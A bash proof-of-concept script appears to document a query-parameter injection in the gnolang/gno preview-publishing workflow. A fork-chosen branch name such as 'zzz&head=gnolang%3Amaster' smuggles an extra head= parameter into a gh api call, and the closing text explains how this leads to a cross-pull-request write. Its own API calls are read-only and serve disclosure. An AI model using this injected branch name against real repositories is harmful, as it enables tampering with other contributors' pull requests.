#!/usr/bin/env bash
# What this measures: .github/workflows/pr-preview-publish.yml resolves the pull
# request with
#
#   gh api "repos/$REPO/pulls?state=open&per_page=100&head=$HEAD_OWNER:$HEAD_BRANCH"
#
# under the comment "Resolve it from the workflow_run payload, which the fork
# does not control". HEAD_BRANCH is github.event.workflow_run.head_branch — the
# branch name in the fork, which the fork picks. It is pasted into the query
# unencoded, so a branch name carrying "&" appends query parameters of its own.
#
# The two facts this script measures, both read-only:
#   1. a git ref may carry "&" and "%3A", so "zzz&head=<owner>%3A<branch>" is a
#      pushable branch name;
#   2. the GitHub REST API takes the LAST occurrence of a repeated query
#      parameter, so the injected head= replaces the one the workflow wrote.
#
# Repro from a plain clone (gh authenticated, read-only calls only):
#
#   git clone https://github.com/gnolang/gno && cd gno
#   git fetch origin pull/6194/head && git checkout ecf7af0f29abe4737a52803d672bc5a33c17cc60
#   bash <this file>
set -u

echo "== 1. branch names the render job would report as head_branch =="
for b in 'zzz&head=gnolang%3Amaster' 'zzz&state=all' 'feat/a+b'; do
	if git check-ref-format --branch "$b" >/dev/null 2>&1; then
		echo "  VALID   $b"
	else
		echo "  INVALID $b"
	fi
done

echo "== 2. repeated query parameter: which one the API honours =="
echo -n "  state=open&state=closed -> "
gh api "repos/gnolang/gno/pulls?state=open&state=closed&per_page=3" --jq '[.[].state]'

echo "== 3. the same override applied to head=, as the branch name would =="
victim=$(gh api "repos/gnolang/gno/pulls?state=open&per_page=1" \
	--jq '.[] | "\(.number) \(.head.label) \(.head.sha)"')
vnum=${victim%% *}
vlabel=$(printf '%s' "$victim" | cut -d' ' -f2)
vowner=${vlabel%%:*}
vref=${vlabel#*:}
echo "  an unrelated open pull request: #$vnum from $vlabel"
echo -n "  head=<attacker>:zzz                                    -> "
gh api "repos/gnolang/gno/pulls?state=open&per_page=100&head=nobody-xyz:zzz" --jq 'length'
echo -n "  head=<attacker>:zzz&head=$vowner%3A$vref -> "
gh api "repos/gnolang/gno/pulls?state=open&per_page=100&head=nobody-xyz:zzz&head=$vowner%3A$vref" \
	--jq '.[] | "\(.number) \(.head.sha)"'
echo
echo "The last line is what the privileged job's \$prs would hold: another pull"
echo "request's number and head sha. The head-SHA equality check below it is then"
echo "the only thing left between the fork and the cross-pull-request write that"
echo "round 1 closed, and it is satisfied by pushing that same commit to the"
echo "attacker's own branch. A branch name carrying '&' with no injection is the"
echo "quieter half: the head= filter is truncated at the '&', nothing matches, and"
echo "the job prints 'closed while rendering; nothing to publish' for an open pull"
echo "request that never gets a preview."
